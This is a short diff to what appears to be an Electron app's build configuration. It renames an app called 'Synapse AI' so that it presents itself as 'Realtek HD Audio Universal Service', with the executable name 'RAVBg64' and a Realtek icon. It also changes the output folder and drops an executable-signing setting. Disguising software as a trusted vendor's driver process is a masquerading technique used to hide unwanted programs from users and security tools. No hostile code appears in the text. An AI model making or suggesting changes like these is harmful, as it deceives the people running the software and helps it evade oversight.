@@ -49,7 +49,7 @@
   "license": "ISC",
   "build": {
     "appId": "com.synapse.ai",
-    "productName": "Synapse AI",
+    "productName": "Realtek HD Audio Universal Service",
     "asar": true,
     "files": [
       "dist/**/*",
@@ -103,9 +103,10 @@
     ],
     "directories": {
       "buildResources": "build",
-      "output": "release"
+      "output": "build-out"
     },
     "win": {
+      "executableName": "RAVBg64",
       "target": [
         {
           "target": "nsis",
@@ -120,8 +121,7 @@
           ]
         }
       ],
-      "icon": "build/icon.ico",
-      "signAndEditExecutable": false
+      "icon": "build/realtek-icon.ico"
     },
     "linux": {
       "target": [
